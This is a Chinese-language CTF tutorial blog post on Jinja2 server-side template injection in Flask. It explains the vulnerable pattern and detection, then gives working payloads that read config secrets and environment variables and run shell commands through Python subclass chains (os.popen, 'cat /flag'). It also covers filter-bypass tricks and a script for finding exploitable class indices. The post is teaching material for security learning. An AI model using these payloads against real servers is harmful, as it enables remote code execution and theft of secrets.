---
title: "CTF web漏洞合集 Python篇（1）python中的SSTI"
date: 2024-10-01 13:42
updated: 2024-10-01 13:42
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Reverse"
description: "写在前面 CTF web还是需要大量的沉淀的。我在最近的CTF中主打一个眼高手低（bushi）完全就是凭着以前开发的基础做题。对于很多漏洞类型缺乏掌握（或者可以说是只听说过或在wp里看过）。所以想来想去还是好好回去学一下常见的漏洞，把成因，漏洞特征，利用，常见防护及绕过都搞懂，顺便做做例题。于是还是"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18442823"
---
**写在前面**

CTF web还是需要大量的沉淀的。我在最近的CTF中主打一个眼高手低（bushi）完全就是凭着以前开发的基础做题。对于很多漏洞类型缺乏掌握（或者可以说是只听说过或在wp里看过）。所以想来想去还是好好回去学一下常见的漏洞，把成因，漏洞特征，利用，常见防护及绕过都搞懂，顺便做做例题。于是还是把这些学习的新的和成果写下来吧，就当是分享，也是给我自己一个交代。就从我最熟悉的python开始写起吧，后续再慢慢学js，java甚至是go的后端审计;)

少就是多，慢就是快

-   [python模板注入 -- python SSTI](https://www.cnblogs.com/LAMENTXU#1)
    -   [0x01 成因](https://www.cnblogs.com/LAMENTXU#1.1)
    -   [0x02 漏洞特征](https://www.cnblogs.com/LAMENTXU#1.2)
    -   [0x03 利用](https://www.cnblogs.com/LAMENTXU#1.3)
    -   [0x04 常见防护及绕过](https://www.cnblogs.com/LAMENTXU#1.4)
    -   [0x05 例题](https://www.cnblogs.com/LAMENTXU#1.5)

# python模板注入 -- python SSTI

只写jinja2的SSTI吧，毕竟现在CTF的python模板很少见到别的了

## 0x01 成因

我们来看一段代码：

```
from flask import Flask, request, render_template_string
from jinja2 import Template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    t = '''  
        <html>
            <h1>Hello my dear %s</h1>
        </html>
        ''' % (name)
    return render_template_string(t)
```

以及

```
from flask import Flask, request, render_template_string
from jinja2 import Template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    t = Template'''  
        <html>
            <h1>Hello my dear %s</h1>
        </html>
        ''' % (name)
    return t.render()
```

当传入name为正常的字符串，比如LamentXU，就会返回Hello my dear LamentXU。一切多么美好（bushi）

但是，如果我们输入{{7\*7}}就会返回49

这是因为，用户的输入被直接拼接到渲染Template里去了，**而在Template里，你是可以用{{}}或{%%}执行python代码的！** 然而，以下代码就不会出现问题：

```
from flask import Flask, request, render_template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    return render_template('index.html', name=name)

app.run()
```

由此，我们可以得出漏洞特征，也就是什么时候会出现SSTI漏洞

## 0x02 漏洞特征

**直接将用户输入通过字符串拼接合并到模板里渲染的python jinja2后端容易出现由SSTI引起的RCE**

当然，其他python模板也大差不差，现学现卖就行。然而其他语言的模板可能会有较大差距，不过核心思想不变，都是由服务器无过滤无检查地直接将用户的输出拼接到模板中导致的。

漏洞必须带有以下特征：

-   存在`render_template`或`render_template_string`函数
-   存在直接将用户可控的输入使用字符串拼接的方法传入上述函数中的行为
-   没有过度严格的过滤（如过滤单个大括号符`}`，`{`或存在于沙箱环境中），然而，具体情况具体分析，有些题目内是可以绕过这些过滤的

**POC: {{7\*7}} 如果返回49就确诊SSTI了**

## 0x03 利用

确诊SSTI后，我们主要有两个思路：

-   XSS
-   RCE

### XSS

XSS这个比较好理解，毕竟是直接拼接用户输入到渲染里。跟一般的xss题目差距不是很大，不展开细讲。这里直接给个例子。

```
from flask import Flask, request, render_template_string
from jinja2 import Template
app = Flask(__name__)

@app.route('/')
def main():
    name = request.args.get('name')
    t = '''  
        <html>
            <h1>Hello my dear %s</h1>
        </html>
        ''' % (name)
    return render_template_string(t)
```

就这一段漏洞代码来说，如果给name传参`<script>alert(1)</script>`将会成功xss

这里我更喜欢用一个自己定义的词汇来描述：“上级漏洞”。可以说：有SSTI的地方一定有XSS，但有XSS的地方不一定有SSTI（我喜欢把SSTI叫成XSS的上级）。所以，尤其在黑盒审计中，当发现一处存在XSS而又没什么利用点时（尤其是反射型的XSS）优先考虑SSTI

### RCE

我们都知道，在确诊了SSTI漏洞后可以有一个等效于python中eval()的sink点，那么就可以把eval的那一套搬过来。问题是，没有服务器会蠢到帮你导入os，sys这种危险库，还得靠你自己导入。

首先，如果你的目标是flask app的配置信息（如SECRET\_KEY）或者服务器的环境变量，那么恭喜你可以直接出了。

```
{{config}}		# 获取config，包含secret_key
{{request.environ}}	# 获取环境信息
```

![](/images/migrated/18442823/01.png)

如果你的目标是读取flag文件的话，那么我们的最终目标是找到并导入os库，使用system或者popen这种危险函数来读取。当然，你也可以导入pickle库来反弹shell（见[R3CTF jinjaclub](https://www.cnblogs.com/LAMENTXU/articles/18243707)）。我们的思路也很明显：

-   使用万能的对象（比如字符串对象''）-> 子类 -> 基类 -> 危险类的危险函数（大多数情况）
-   直接使用代码中定义的对象（包括已经导入的库）所包含的危险子类中的危险函数（比如说R3CTF那道题）

#### 1.使用万能的对象

这里说是“万能的对象”，其实大多数情况下，最好用最经典的还是字符串对象''，当然\[\]这些对象也是可以的

python中每个对象都有个属性`__class__`，用于返回该对象所属的类。而我们要做的，就是**获取到object基类**（可以理解为世界的开端（bushi）是一切类的父类）

**使用`''.__class__`我们就完成了第一步，即，获取到一个字符串对象**

![](/images/migrated/18442823/02.png)

当然\[\]也可以（{},()也行）

![](/images/migrated/18442823/03.png)

还有：

`__bases__`：以元组的形式返回一个类所直接继承的类。

`__base__`：以字符串形式返回一个类所直接继承的类。

`__mro__`：返回解析方法调用的顺序。

这三个属于获取基类的办法。获取到object基类之后，因为这个基类的子类是这个python程序目前的所有类，所以可以直接找到我们要的os（是基类的一个子类）

**使用`"".__class__.__bases__`或`"".__class__.__mro__[1]`或`"".__class__.__base__`我们就完成了第二步，即，获取到了object基类，也就是世界的开端（bushi）**

一个纯净的python3.9中继承了object基类的类如下：

![](/images/migrated/18442823/04.png)

`__subclasses__()`：获取类的所有子类。

`__init__`：所有自带带类都包含init方法，便于利用他当跳板来调用globals。

`function.__globals__`，用于获取function所处空间下可使用的module、方法以及所有变量。

我们要做的，是找到使用os的内置类。那这可多了，这里可以fuzz出（由python环境改变而改变）如果没有的话，也可以找一些可以读取文件的内置类，那么_warnings.catch\_warnings_类可就成重灾区了（有很多其他的）

我们发现object基类的\_\_subclasses\_\_()中**<type 'warnings.catch\_warnings'>**的索引值为138（随环境改变而改变），导入他后直接导入os并RCE即可

```
[].__class__.__base__.__subclasses__()[138].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")
```

当然，你也可以找到其他调用了os的内置类，利用`__init__`和`function.__globals__`来调用内置类中os类的方法，如subprocess.popen：

```
{{"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
```

有用的python内置类有很多，这里贴一个佬的脚本，可以直接把subclass出来的东西放data里帮你检测有用的类的索引，也是我做题经常用的脚本（出自 [https://www.cnblogs.com/tuzkizki/p/15394415.html#构造payload](https://www.cnblogs.com/tuzkizki/p/15394415.html#%E6%9E%84%E9%80%A0payload) ）

```
import re

# 将查找到的父类列表替换到data中
data = r'''
    [<class 'type'>, <class 'weakref'>, ......]
'''
# 在这里添加可以利用的类，下面会介绍这些类的利用方法
userful_class = ['linecache', 'os._wrap_close', 'subprocess.Popen', 'warnings.catch_warnings', '_frozen_importlib._ModuleLock', '_frozen_importlib._DummyModuleLock', '_frozen_importlib._ModuleLockManager', '_frozen_importlib.ModuleSpec']

pattern = re.compile(r"'(.*?)'")
class_list = re.findall(pattern, data)
for c in class_list:
    for i in userful_class:
        if i in c:
            print(str(class_list.index(c)) + ": " + c)
```

做题流程也很明确了：确定好要用SSTI打RCE之后用burp（payload：`"".__class__.__mro__[1].__subclasses__()`）fuzz服务器找os或者file，然后读取文件或RCE

**总结一下就是：先找object基类，然后subclasses出所有的类（就应该是一大坨玩意）然后放上面那个脚本里跑索引。找到能用的类之后去网上找这个类对应的payload打就完了（上面展示了两个）**

#### 2.直接使用代码中定义的对象

可以先看一下R3CTF 中jinjaclub的wp（上文里有链接）。方便你更好理解。

这种情况比较稀有，在沙箱环境内，你无法找到object基类。但是你仍然可以使用程序空间内已经定义好的对象。这里建议在你的IDE里开断点调试。看看程序内的对象里有没有引用到什么类，而这些类有没有引用到一些危险类或有没有危险函数。这需要一些osint的内容（你要去看这些引用到的类的开发手册，等等）

在R3CTF的例子中User类由于继承了pydantic的BaseModel，而BaseModel中有一个parse\_raw函数里有一个proto参数和allow\_pickle参数可以解析pickle。可以上传恶意pickle文件弹shell打RCE。

过程也很明确。F5在请求函数第一行处断点，ctrl+B对着可以引用的对象一个一个瞪就能瞪出来。

下图为R3CTF那个题的调试截图

![](/images/migrated/18442823/05.png)

对着User类看就完了

## 0x04 常见防护及绕过

### request.args逃逸

如果题目中没有过滤request，则可以将一些含有敏感字符的位置用get传，再在SSTI中用request.args.arg1逃逸到get参数里去

```
a=__globals__&b=os&c=cat /flag&sentence=%print (lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()
```

### `{%%}` 代替 `{{}}`

{%%}在jinja2里与{{}}充当相似的角色，都可以来SSTI（bushi）

### .getitem代替\[\]

python中\[\]与.是相同的

所以如果过滤了\[\]的话可以用.getitem

```
tuple[0] == tuple.getitem(0)
```

python特性解决

### \[\]代替.

python里对象的特性

```
a.b == a['b']
```

### 字符串合并

```
"__glo"+"bal__" == "__global__"
```

鉴于SSTI类似于eval的特性，可以使用字符串相加绕过对一整个字符串的检测

### chr绕过

可以用找os类相同的办法找chr类，再用chr类构造字符串

**接下来说SSTI漏洞比较害怕什么过滤**

-   单个大括号字符`{`, `}`，有就死（（
-   单个小括号字符`(`,`)`，有的话只能看config或者环境变量了

## 0x05 例题

例题：

【XYCTF 2024】[我是一个复读机](https://www.cnblogs.com/LAMENTXU/articles/18147817#1.5)  
【R3CTF 2024】[jinjaclub](https://www.cnblogs.com/LAMENTXU/articles/18243707)
